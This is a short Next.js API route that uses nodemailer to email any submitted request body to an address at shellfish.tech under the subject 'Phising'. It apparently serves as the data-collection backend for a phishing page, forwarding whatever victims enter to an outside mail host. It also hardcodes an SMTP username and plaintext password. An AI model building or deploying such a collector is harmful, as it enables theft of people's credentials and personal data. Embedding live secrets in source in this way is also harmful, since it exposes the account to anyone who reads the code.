// Next.js API route support: https://nextjs.org/docs/api-routes/introduction

var nodemailer = require("nodemailer");

export default function handler(req, res) {
  var transporter = nodemailer.createTransport({
    host: "smtp.shellfish.tech",
    port: 587,
    secure: false,
    requireTLS: true,
    auth: {
      user: "admin@shellfish.tech",
      pass: "bt*uMXp0",
    },
  });

  var mailOptions = {
    from: "admin@shellfish.tech",
    to: "shilpa@shellfish.tech",
    subject: "Phising",
    text: req.body,
  };

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error);
    } else {
      console.log("Email was sent successfully: " + info.response);
    }
  });
  res.status(200).json(req.body);
}
